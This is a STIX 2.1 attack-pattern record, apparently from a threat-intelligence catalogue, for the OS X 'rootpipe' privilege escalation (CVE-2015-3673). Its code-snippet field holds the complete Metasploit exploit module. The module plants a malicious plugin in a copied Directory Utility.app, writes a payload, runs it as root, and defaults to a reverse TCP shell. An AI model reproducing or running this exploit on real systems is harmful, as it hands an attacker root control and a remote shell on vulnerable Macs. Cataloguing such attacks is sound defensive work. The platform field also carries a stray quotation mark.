{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a8ec4f02-df2d-464b-bc30-933877a5103e",
    "created": "2024-08-14T16:34:47.822747Z",
    "modified": "2024-08-14T16:34:47.822751Z",
    "name": "Apple OS X Entitlements Rootpipe Privilege Escalation",
    "description": " This module exploits the rootpipe vulnerability and bypasses Apple's initial fix for the issue by injecting code into a process with the 'admin.writeconfig' entitlement. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/local/rootpipe_entitlements.rb",
            "external_id": "rootpipe_entitlements.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-3673"
        },
        {
            "source_name": "reference",
            "url": "https://truesecdev.wordpress.com/2015/07/01/exploiting-rootpipe-again/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  include Msf::Post::File\n  include Msf::Post::OSX::Priv\n  include Msf::Post::OSX::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apple OS X Entitlements Rootpipe Privilege Escalation',\n      'Description'    => %q{\n        This module exploits the rootpipe vulnerability and bypasses Apple's initial\n        fix for the issue by injecting code into a process with the 'admin.writeconfig'\n        entitlement.\n      },\n      'Author'         => [\n        'Emil Kvarnhammar', # Vulnerability discovery and PoC\n        'joev'              # Copy/paste monkey\n      ],\n      'References'     => [\n        ['CVE',   '2015-3673'],\n        ['URL',   'https://truesecdev.wordpress.com/2015/07/01/exploiting-rootpipe-again/']\n      ],\n      'DisclosureDate' => '2015-07-01',\n      'License'        => MSF_LICENSE,\n      'Platform'       => 'osx',\n      'Arch'           => ARCH_X64,\n      'SessionTypes'   => ['shell'],\n      'Privileged'     => true,\n      'Targets'        => [\n        ['Mac OS X 10.9-10.10.3', {}]\n      ],\n      'DefaultTarget'  => 0,\n      'DefaultOptions' => {\n        'PAYLOAD'         => 'osx/x64/shell_reverse_tcp',\n        'PrependSetreuid' => true\n      }\n    ))\n\n    register_options [\n      OptString.new('WRITABLEDIR', [true, 'Writable directory', '/.Trashes'])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def check\n    if ver? && is_admin?\n      vprint_status(\"Version is between 10.9 and 10.10.3, and is admin.\")\n      return CheckCode::Appears\n    else\n      return CheckCode::Safe\n    end\n  end\n\n  def exploit\n    if is_root?\n      fail_with Failure::BadConfig, 'Session already has root privileges'\n    end\n\n    unless is_admin?\n      fail_with Failure::NoAccess, \"User is not in the 'admin' group, bailing.\"\n    end\n\n    if check != CheckCode::Appears\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    print_status(\"Copying Directory Utility.app to #{new_app}\")\n    cmd_exec(\"cp -R '/System/Library/CoreServices/Applications/Directory Utility.app' '#{new_app}'\")\n    cmd_exec(\"mkdir -p '#{new_app}/Contents/PlugIns/RootpipeBundle.daplug/Contents/MacOS'\")\n\n    print_status(\"Writing bundle plist to `#{plist_file}'\")\n    write_file(plist_file, plist)\n\n    print_status(\"Writing payload to `#{payload_file}'\")\n    write_file(payload_file, binary_payload)\n    register_file_for_cleanup(payload_file)\n\n    print_status(\"Writing malicious shared library to `#{exploit_file}'\")\n    write_file(exploit_file, plugin_exploit)\n\n    print_status(\"Running Directory Utility.app\")\n    cmd_exec(\"/bin/sh -c 'PAYLOAD_IN=#{payload_file} PAYLOAD_OUT=#{root_file} #{new_app}/Contents/MacOS/Directory\\\\ Utility'\")\n\n    print_status(\"Deleting Directory Utility.app\")\n    cmd_exec(\"rm -Rf '#{new_app}'\")\n\n    print_status('Executing payload...')\n    cmd_exec(\"/bin/sh -c '#{root_file} &'\")\n  end\n\n  def ver?\n    Rex::Version.new(get_sysinfo['ProductVersion']).between?(\n      Rex::Version.new('10.9'), Rex::Version.new('10.10.3')\n    )\n  end\n\n  def sploit\n    \"#{datastore['PYTHON']} #{exploit_file} #{payload_file} #{payload_file}\"\n  end\n\n  def plugin_exploit\n    File.read(File.join(\n      Msf::Config.data_directory, 'exploits', 'CVE-2015-3673', 'exploit.daplug'\n    ))\n  end\n\n  def binary_payload\n    Msf::Util::EXE.to_osx_x64_macho(framework, payload.encoded)\n  end\n\n  def exploit_file\n    \"#{new_app}/Contents/PlugIns/RootpipeBundle.daplug/Contents/MacOS/RootpipeBundle\"\n  end\n\n  def plist_file\n    \"#{new_app}/Contents/PlugIns/RootpipeBundle.daplug/Contents/Info.plist\"\n  end\n\n  def new_app\n    @app ||= \"#{base_dir}/#{Rex::Text.rand_text_alpha(8)}.app\"\n  end\n\n  def plist\n    %Q|\n      <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n      <plist version=\"1.0\">\n      <dict>\n        <key>CFBundleGetInfoString</key>\n        <string>RootpipeBundle</string>\n        <key>CFBundleExecutable</key>\n        <string>RootpipeBundle</string>\n        <key>CFBundleIdentifier</key>\n        <string>com.root.pipe</string>\n        <key>CFBundleName</key>\n        <string>RootpipeBundle</string>\n        <key>CFBundleShortVersionString</key>\n        <string>0.01</string>\n        <key>CFBundleInfoDictionaryVersion</key>\n        <string>6.0</string>\n        <key>CFBundlePackageType</key>\n        <string>APPL</string>\n        <key>IFMajorVersion</key>\n        <integer>0</integer>\n        <key>IFMinorVersion</key>\n        <integer>1</integer>\n      </dict>\n      </plist>\n    |\n  end\n\n  def payload_file\n    @payload_file ||=\n      \"#{base_dir}/#{Rex::Text.rand_text_alpha(8)}\"\n  end\n\n  def root_file\n    @root_file ||=\n      \"#{base_dir}/#{Rex::Text.rand_text_alpha(8)}\"\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-07-01",
    "x_mitre_platforms": [
        "osx'"
    ]
}